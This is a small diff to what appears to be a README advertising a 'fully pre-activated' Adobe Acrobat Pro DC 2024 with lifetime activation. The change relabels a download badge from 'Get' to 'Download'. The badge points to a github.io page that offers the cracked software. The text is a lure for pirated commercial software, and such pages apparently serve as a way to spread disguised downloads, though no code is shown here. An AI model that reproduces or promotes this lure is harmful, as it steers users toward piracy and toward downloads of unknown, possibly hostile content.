@@ -2,7 +2,7 @@
 
 Transform your document workflow with this fully pre-activated version of Adobe Acrobat Pro DC 2024. This premium PDF editor comes with lifetime activation, offering unparalleled tools for creating, editing, converting, and securing PDF documents without any subscriptions or recurring fees. Perfect for professionals, businesses, and students who demand reliable PDF manipulation capabilities.
 
-[![Download Adobe Acrobat Pro DC](https://img.shields.io/badge/Get-Adobe_Acrobat_Pro_DC-blueviolet)](https://adobe-acrobat-activated.github.io/.github/)
+[![Download Adobe Acrobat Pro DC](https://img.shields.io/badge/Download-Adobe_Acrobat_Pro_DC-blueviolet)](https://adobe-acrobat-activated.github.io/.github/)
 
 ---
 
